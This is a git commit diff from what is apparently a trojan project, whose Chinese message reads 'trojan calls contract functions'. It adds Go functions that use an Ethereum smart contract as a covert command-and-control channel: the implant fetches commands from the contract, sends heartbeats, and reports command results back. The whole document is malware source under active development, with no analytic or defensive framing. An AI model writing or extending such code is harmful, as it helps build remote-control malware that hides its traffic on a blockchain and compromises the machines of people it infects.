eef509ef6fc5d71127e2ef7cf2c692c54da78202
Tritium0041 <40853544+Tritium0041@users.noreply.github.com>
2024-12-05 17:03:56 +0800

    feat：木马调用合约的函数

--- trojan/src/trojan/Connection/connectToContract.go
+++ trojan/src/trojan/Connection/connectToContract.go
@@ -1,19 +1,18 @@
 package connection
 
 import (
+	"github.com/ethereum/go-ethereum"
 	"github.com/ethereum/go-ethereum/accounts/abi"
-	"github.com/ethereum/go-ethereum/accounts/keystore"
 	"github.com/ethereum/go-ethereum/common"
-	"github.com/ethereum/go-ethereum/core/types"
-	"github.com/ethereum/go-ethereum/crypto"
 	"github.com/ethereum/go-ethereum/ethclient"
+	"strings"
 )
 
 var (
-	PrivateKeyHex string
+	PrivateKeyHex   string
 	ContractAddress string
-	ContractABI string
-	ChainRPC string
+	ContractABI     string
+	ChainRPC        string
 )
 
 func ConnectToChain() (*ethclient.Client, error) {
@@ -24,6 +23,70 @@ func ConnectToChain() (*ethclient.Client, error) {
 	return client, nil
 }
 
+func GetCommand(client *ethclient.Client) (string, error) {
+	contractAddr := common.HexToAddress(ContractAddress)
+	parsedABI, err := abi.JSON(strings.NewReader(ContractABI))
+	if err != nil {
+		return "", err
+	}
+	data, err := parsedABI.Pack("getCommand")
+	if err != nil {
+		return "", err
+	}
+	msg := ethereum.CallMsg{
+		To:   &contractAddr,
+		Data: data,
+	}
+	result, err := client.CallContract(nil, msg, nil)
+	if err != nil {
+		return "", err
+	}
+	var opt string
+	err = parsedABI.UnpackIntoInterface(&opt, "getCommand", result)
+	if err != nil {
+		return "", err
+	}
+	return opt, nil
+}
 
+func Beat(client *ethclient.Client) error {
+	contractAddr := common.HexToAddress(ContractAddress)
+	parsedABI, err := abi.JSON(strings.NewReader(ContractABI))
+	if err != nil {
+		return err
+	}
+	data, err := parsedABI.Pack("beat")
+	if err != nil {
+		return err
+	}
+	msg := ethereum.CallMsg{
+		To:   &contractAddr,
+		Data: data,
+	}
+	_, err = client.CallContract(nil, msg, nil)
+	if err != nil {
+		return err
+	}
+	return nil
+}
 
-
+func SendResult(client *ethclient.Client, res []byte) error {
+	contractAddr := common.HexToAddress(ContractAddress)
+	parsedABI, err := abi.JSON(strings.NewReader(ContractABI))
+	if err != nil {
+		return err
+	}
+	data, err := parsedABI.Pack("sendCommandResult", res)
+	if err != nil {
+		return err
+	}
+	msg := ethereum.CallMsg{
+		To:   &contractAddr,
+		Data: data,
+	}
+	_, err = client.CallContract(nil, msg, nil)
+	if err != nil {
+		return err
+	}
+	return nil
+}
